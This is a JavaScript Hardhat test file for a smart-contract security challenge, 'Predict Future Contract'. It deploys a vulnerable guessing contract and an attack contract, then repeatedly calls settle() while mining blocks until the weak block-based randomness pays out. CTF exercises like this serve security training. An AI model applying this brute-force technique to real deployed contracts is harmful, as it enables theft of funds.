const {ethers} = require("hardhat");
const hre = require("hardhat");
const {expect} = require("chai");


describe('[Challenge] Predict Future Contract', function () {

    let deployer, player, attacker;
    let baseContract, attackContract;
    let payment;


    before(async function () {
        /** SETUP SCENARIO */
        [deployer, player, attacker] = await ethers.getSigners();
        this.amount = 1000000;
        const baseContractFactory = await ethers.getContractFactory('PredictTheFutureChallenge', deployer);
        const attackContractFactory = await ethers.getContractFactory('AttackPredictTheFuture', attacker);
        payment = hre.ethers.utils.parseEther('1');
        baseContract = await baseContractFactory.deploy({value: payment});
        attackContract = await attackContractFactory.deploy(baseContract.address);
        await baseContract.deployed();
        await attackContract.deployed();
        expect(
            await baseContract.isComplete()
        ).to.equal(false);
    });

    it('Exploit Future Attack', async function () {
        /** CODE YOUR EXPLOIT HERE */
        await attackContract.connect(attacker).attack({value: payment});
        let completed = false;
        while (!completed) {

            try {

                let success = await attackContract.connect(attacker).settle();
                await mineNBlocks(1);
                success = await success.wait();
                completed = await baseContract.isComplete();
            } catch (e) {
                await mineNBlocks(1);
            }

        }

    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await baseContract.isComplete()
        ).to.be.equal(true);


    });
});

async function mineNBlocks(n) {
    for (let index = 0; index < n; index++) {
        await hre.ethers.provider.send('evm_mine');
    }
}